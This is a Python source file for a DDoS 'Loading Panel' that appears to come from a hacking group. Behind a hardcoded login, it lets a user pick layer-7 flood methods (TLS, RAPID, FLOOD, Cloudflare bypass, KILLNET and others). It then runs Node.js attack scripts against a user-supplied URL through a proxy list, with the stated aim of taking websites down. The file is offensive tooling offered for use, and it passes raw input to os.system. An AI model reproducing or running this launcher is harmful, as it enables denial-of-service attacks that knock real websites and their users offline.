# -*- coding: utf-8 -*-

from operator import index
import subprocess
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = "@ANONTENBD"

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (163, 16, 124)
end_color = (163, 16, 124)

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""

 ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████ 
▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓
░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒
░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░ 
  ░ ░   ░ ░ ░ ▒   ░   ▒  ░ ░  ░  ▒ ░ ░   ░ ░░ ░   ░ 
    ░  ░  ░ ░  ░   ░  ░   ░     ░      ░     ░    ░   ░
                            ░                             
           𝗟𝗢𝗔𝗗𝗜𝗡𝗚-𝗣𝗔𝗡𝗘𝗟 —— [ 𝗟𝗔𝗬𝗘𝗥7 𝗠𝗘𝗧𝗛𝗢𝗗𝗦 ]
           | HELP@ANONTENBD |      
           𝗦𝗧𝗔𝗥𝗧 𝗔𝗧𝗧𝗔𝗖𝗞[𝑴𝑬𝑻𝑯𝑶𝑫/𝑼𝑹𝑳/𝑻𝑰𝑴𝑬]  
  • 𝗧𝗟𝗦 [𝗗𝗢𝗪𝗡 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗨𝗡𝗧𝗜𝗟 𝗧𝗜𝗠𝗘 𝗟𝗘𝗙𝗧]         
  • 𝗥𝗔𝗣𝗜𝗗 [𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗥𝗣𝗦 𝗙𝗔𝗦𝗧𝗟𝗬]                                        •  404 [𝗙𝗨𝗖𝗞𝗜𝗡𝗚 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗛𝗔𝗥𝗗𝗟𝗬]                              •  𝗛𝗧𝗧𝗣 [𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗛𝗜𝗚𝗛 𝗥𝗣𝗦]            
  • 𝗙𝗟𝗢𝗢𝗗 [𝗙𝗢𝗥 𝗡𝗢𝗥𝗠𝗔𝗟 𝗦𝗜𝗧𝗘]    
  • 𝗖𝗙 [𝗖𝗟𝗢𝗨𝗗𝗙𝗔𝗥𝗘 𝗕𝗬𝗣𝗔𝗦𝗦]                     
  • 𝗟𝗢𝗔𝗗𝗜𝗡𝗚 [𝗕𝗬𝗣𝗔𝗦𝗦 𝗛𝗧𝗧𝗣] 
                                 
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""

 ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████ 
▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓
░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒
░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░ 
  ░ ░   ░ ░ ░▒  ░   ▒    ░     ░░  ▒ ░   ░  ░ ░ ░ ░   ░ 
    ░  ░    ░ ░ ░   ░  ░  ░   ░     ░ ░    ░  ░      ░ 
                            ░           
    TYPE LAYER7                 
                                              
""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] 𝕃𝕆𝔸𝔻𝕀ℕ𝔾-ℙ𝔸ℕ𝔼𝕃 :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[31mroot@ᒪOᗩᗪIᑎG-ᑭᗩᑎEᒪ\x1b[1;31m\:~# \x1b[1;\033[31m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "layer7" or sinput == "LAYER7" or sinput == ".layer7" or sinput == ".LAYER7" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "TLS" or sinput == "tls":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS.js {target} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "RAPID" or sinput == "rapid":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node RAPID.js {target} {time} 15 proxy.txt 64')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "404" or sinput == "404":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node 404.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "CF" or sinput == "cf":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CF.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "FLOOD" or sinput == "flood":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 &&  node FLOOD.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "HTTP" or sinput == "http":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTP.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "LOADING" or sinput == "loading":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node LOADING.js {url} {time} proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "KILLNET" or sinput == "killnet":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node KILLNET {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "XMIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node XMIX.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
     	

def login():
	sys.stdout.write(f"\x1b]2;[\] 𝕃𝕆𝔸𝔻𝕀ℕ𝔾-ℙ𝔸ℕ𝔼𝕃 :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "PANEL"
	passwd = "ANON"
	username = input("""\033[31m
	

 ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████ 
▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓
░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒
░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░ 
  ░ ░   ░ ░ 𝗟░ ▒   𝗢░   ▒ 𝗔 ░ ░  𝗗░  ▒  𝗜░   ░  𝗡 ░ ░ ░𝗚░   ░ 
    ░  ░    ░ ░    ░ 𝗣 ░  ░  𝗔 ░    ░𝗡      ░ 𝗘   ░   ░𝗟   ░      ░
                            ░                             
         
                𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗟𝗢𝗔𝗗𝗜𝗡𝗚 𝗣𝗔𝗡𝗘𝗟 
                             		   
                        \033[[\033[31mUSER\033[]:\033[31m """)
	password = getpass.getpass(prompt='                        \033[[\033[31mPASS\033[]:\033[31m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[31m                   ")
		time.sleep(1)
		main()

login()